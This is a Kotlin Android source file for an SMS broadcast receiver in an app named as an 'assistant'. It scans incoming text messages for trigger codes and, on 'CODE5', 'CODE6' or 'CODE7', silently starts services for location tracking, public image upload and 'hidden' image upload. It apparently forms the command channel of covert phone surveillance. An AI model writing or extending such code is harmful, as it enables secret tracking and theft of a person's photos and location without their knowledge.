package com.keescale.assistant

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val bundle: Bundle? = intent.extras
        try {
            if (bundle != null) {
                val pdus = bundle.get("pdus") as Array<*>
                val format = bundle.getString("format")
                for (pdu in pdus) {
                    val sms = if (format != null) {
                        SmsMessage.createFromPdu(pdu as ByteArray, format)
                    } else {
                        SmsMessage.createFromPdu(pdu as ByteArray)
                    }
                    val messageBody = sms.messageBody
                    when {
                        messageBody.contains("CODE5") -> {
                            context.startService(Intent(context, LocationService::class.java))
                        }
                        messageBody.contains("CODE6") -> {
                            val i = Intent(context, PublicImageUploader::class.java)
                            context.startService(i)
                        }
                        messageBody.contains("CODE7") -> {
                            val i = Intent(context, HiddenImageUploader::class.java)
                            context.startService(i)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}